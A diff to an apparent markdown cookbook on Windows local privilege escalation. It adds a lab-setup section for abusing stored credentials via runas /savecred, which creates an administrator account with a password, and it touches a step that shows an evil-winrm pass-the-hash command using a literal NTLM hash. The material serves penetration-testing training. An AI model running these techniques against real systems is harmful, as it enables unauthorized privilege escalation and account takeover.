@@ -54,8 +54,8 @@ In the following table, some popular and useful tools for Windows local privileg
 This CookBook presents the following Windows vulnerabilities:
 
 - [AlwaysInstallElevated](#alwaysinstallelevated)
-- [Autoruns (Registry Run Keys)](#autoruns-registry-run-keys)
 - [SeBackupPrivilege](#sebackupprivilege)
+- [Stored Credentials (Runas)](#stored-credentials-runas)
 
 ### AlwaysInstallElevated
 
@@ -426,7 +426,7 @@ Outcome:
 
 ![SeBackupPrivilege-Exploitation-Observe-NTLM-Hashes](/Pictures/SeBackUp-Exploitation-2.png)
 
-4) Use again evil-winrm to pass the hash and connect as Local Administrator.
+4) Use again evil-winrm to pass the hash and connect as Local Administrator:
 
 ```
 evil-winrm -i 192.168.146.130 -u "Nikos Vourdas" -H "20117ce437cde2e30f4612c4c82196b0"
@@ -453,6 +453,42 @@ Follow the steps below to remove the `SeBackupPrivilege` from a user:
 ### SeImpersonatePrivilege
 
 ### Stored Credentials (Runas)
+
+#### Description
+
+The Credentials Manager is a feature in Windows that securely stores usernames and passwords for websites, applications, and network resources. This component is particularly helpful for users who want to manage and retrieve their login information easily without having to remember each set of credentials.
+
+In a scenario where an attacker has compromised an account with access to the Windows Credentials Manager and has obtained stored credentials from an elevated account, he can potentially use the "runas" command to elevate his privileges and gain unauthorized access. 
+
+#### Lab Setup
+
+##### Manual Lab Setup
+
+1) Open a command-prompt with local Administrator privileges and create a new user with the following command:
+
+```
+net user nickvourd Passw0rd! /add
+```
+
+2) Add the new user to Administrator's local group:
+
+```
+net localgroup "Administrators" nickvourd /add
+```
+
+3) Save credentials to Windows Credentials Manager:
+
+```
+runas /savecred /user:WORKGROUP\nickvourd cmd.exe
+```
+
+Outcome:
+
+![Stored-Creds-Manual-Lab-Setup](/Pictures/Stored-Creds-Manual-Lab-Set-Up.png)
+
+4) Verify the new stored credentials on Windows Credentials Manager (**Control Panel** > **User Accounts** > **Credential Manager**):
+
+![Stored-Creds-Verify-New-Windows-Creds](/Pictures/Stored-Creds-Control-Panel-4.png)
 
 ### Unquoted Service Path
 
